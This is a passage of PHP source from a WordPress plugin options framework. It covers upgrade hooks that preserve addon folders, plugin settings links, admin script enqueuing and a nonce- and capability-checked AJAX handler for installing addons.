	$plugins_dir = rtrim(str_replace(array('\\', '/'), DIRECTORY_SEPARATOR, realpath($plugins_dir)), DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;
	
	$plugin = $extra['plugin'];
	$plugin_dir = rtrim(str_replace(array('\\', '/'), DIRECTORY_SEPARATOR, realpath(dirname($plugins_dir . $plugin))), DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;
	
	$dir = get_temp_dir();
	$name = time();
	$dir = rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . wp_unique_filename($dir, $name) . DIRECTORY_SEPARATOR;
	$list = array();
	
	foreach ($module_list as $module_id)
	{
		$addon_list = synved_plugout_module_addon_list($module_id);
	
		if ($addon_list != null)
		{
			foreach ($addon_list as $addon_name => $addon_file)
			{
				if (file_exists($addon_file))
				{
					$addon_dir = dirname($addon_file);
					$parent_dir = dirname($addon_dir);
					
					// clean names for comparison
					$addon_dir = rtrim(str_replace(array('\\', '/'), DIRECTORY_SEPARATOR, realpath($addon_dir)), DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;
					$parent_dir = rtrim(str_replace(array('\\', '/'), DIRECTORY_SEPARATOR, realpath($parent_dir)), DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;
					
					if (strtolower($parent_dir) != strtolower($plugins_dir) && strpos(strtolower($addon_dir), strtolower($plugin_dir)) !== false)
					{
						$path = $dir;
						$diff = substr($addon_dir, strlen($plugins_dir));
						$path .= $diff;
						
						wp_mkdir_p($path);
						
						copy_dir($addon_dir, $path);
						
						$list[] = array('original' => $addon_dir, 'temporary' => $path);
					}
				}
			}
		}
	}
	
	if ($list != null)
	{
		update_option('synved_option_wp_upgrade_addon_transfer', array('directory' => $dir, 'list' => $list));
		update_option('synved_option_wp_upgrade_addon_transfer_time', time());
	}
	
	return $perform;
}

function synved_option_wp_upgrader_post_install($perform, $extra, $result = null)
{
	$upgrade_transfer = get_option('synved_option_wp_upgrade_addon_transfer');
	
	if ($upgrade_transfer != null)
	{
		$list = $upgrade_transfer['list'];
		
		foreach ($list as $upgrade_item)
		{
			$original = $upgrade_item['original'];
			$temporary = $upgrade_item['temporary'];
			
			wp_mkdir_p($original);
			
			copy_dir($temporary, $original);
		}
		
		global $wp_filesystem;
		
		if ($wp_filesystem != null)
		{
			$directory = $upgrade_transfer['directory'];
			
			$wp_filesystem->delete($directory, true);
		}
		
		update_option('synved_option_wp_upgrade_addon_transfer', '');
	}
		
	return $perform;
}

function synved_option_wp_plugin_action_links($links, $file)
{
	global $synved_option_list;
	
	if ($synved_option_list != null)
	{
		foreach ($synved_option_list as $id => $list)
		{
			$items = synved_option_item_list($id);
			$pages = $synved_option_list[$id]['pages'];
			
			foreach ($pages as $name => $page)
			{
				$link_label = synved_option_item_property($page, 'link-label');
				$link_target = synved_option_item_property($page, 'link-target');
				$link_url = synved_option_page_link_url($id, $name, $page);
				
				if ($link_label == null)
				{
					$link_label = __('Settings');
				}
				
				if ($file == $link_target) 
				{
					$links[] = '<a href="' . $link_url . '">' . $link_label . '</a>';
				}
			}
		}
	}

	return $links;
}

function synved_option_admin_enqueue_scripts()
{
	$uri = synved_option_path_uri();
	
	wp_register_style('synved-option-jquery-ui', $uri . '/jqueryUI/css/snvdopt/jquery-ui-1.9.2.custom.min.css', false, '1.9.2');
	wp_register_style('synved-option-admin', $uri . '/style/admin.css', array('wp-jquery-ui-dialog', 'synved-option-jquery-ui'), '1.0');
	
	wp_register_script('synved-option-script-custom', $uri . '/script/custom.js', array('jquery', 'suggest', 'media-upload', 'thickbox', 'jquery-ui-core', 'jquery-ui-progressbar', 'jquery-ui-dialog'), '1.0.0');
	wp_localize_script('synved-option-script-custom', 'SynvedOptionVars', array('flash_swf_url' => includes_url('js/plupload/plupload.flash.swf'), 'silverlight_xap_url' => includes_url('js/plupload/plupload.silverlight.xap'), 'ajaxurl' => admin_url('admin-ajax.php'), 'synvedSecurity' => wp_create_nonce('synved-option-submit-nonce')));
	
	$page = isset($_GET['page']) ? $_GET['page'] : null;
	$enqueue = false;
	
	global $synved_option_list;
	
	if ($synved_option_list != null)
	{
		foreach ($synved_option_list as $id => $list)
		{
			if (isset($list['pages']) && $list['pages'] != null)
			{
				$page_list = $list['pages'];
				
				foreach ($page_list as $name => $page_object)
				{
					if ($page == synved_option_page_slug($id, $name))
					{
						$enqueue = true;
				
						break;
					}
				}
			}
		}
	}
	
	if ($enqueue)
	{
		wp_enqueue_style('thickbox');
		wp_enqueue_style('farbtastic');
		wp_enqueue_style('wp-pointer');
		wp_enqueue_style('synved-option-jquery-ui');
		wp_enqueue_style('synved-option-admin');
	
		wp_enqueue_script('plupload-all');
		wp_enqueue_script('media-upload');
		wp_enqueue_script('suggest');
		wp_enqueue_script('thickbox');
		wp_enqueue_script('farbtastic');
		wp_enqueue_script('synved-option-script-custom');
	}
}

function synved_option_ajax()
{
	check_ajax_referer('synved-option-submit-nonce', 'synvedSecurity');

	if (!isset($_POST['synvedAction']) || $_POST['synvedAction'] == null) 
	{
		return;
	}

	$action = $_POST['synvedAction'];
	$params = isset($_POST['synvedParams']) ? $_POST['synvedParams'] : null;
	$response = null;
	
	if (is_string($params))
	{
		$parms = json_decode($params, true);
		
		if ($parms == null)
		{
			$parms = json_decode(stripslashes($params), true);
		}
		
		$params = $parms;
	}
	
	switch ($action)
	{
		case 'install-addon':
		{
			if (current_user_can('upload_files') && current_user_can('install_plugins'))
			{
				if (function_exists('synved_option_ajax_type_addon'))
				{
					$response = synved_option_ajax_type_addon($action, $params);
				}
			}
			
			break;
		}
	}

	while (ob_get_level() > 0) 
	{
		ob_end_clean();
	}

	if ($response != null) 
	{
		$response = json_encode($response);

		header('Content-Type: application/json');

		echo $response;
	}
	else 
	{
		header('HTTP/1.1 403 Forbidden');
	}

	exit();
}

add_action('after_setup_theme', 'synved_option_wp_after_setup_theme');
add_action('init', 'synved_option_wp_init');
add_filter('upgrader_source_selection', 'synved_option_wp_upgrader_source_selection', 9, 3);
add_filter('upgrader_pre_install', 'synved_option_wp_upgrader_pre_install', 6, 2);
add_filter('upgrader_post_install', 'synved_option_wp_upgrader_post_install', 10, 3);
add_filter('plugin_action_links', 'synved_option_wp_plugin_action_links', 10, 2);

if (is_admin())
{
	add_action('admin_init', 'synved_option_wp_admin_init');
	add_action('admin_menu', 'synved_option_wp_admin_menu');
	add_action('admin_enqueue_scripts', 'synved_option_admin_enqueue_scripts');
	add_action('wp_ajax_synved_option', 'synved_option_ajax');
}

synved_option_include_module_addon_list('synved-option');

?>
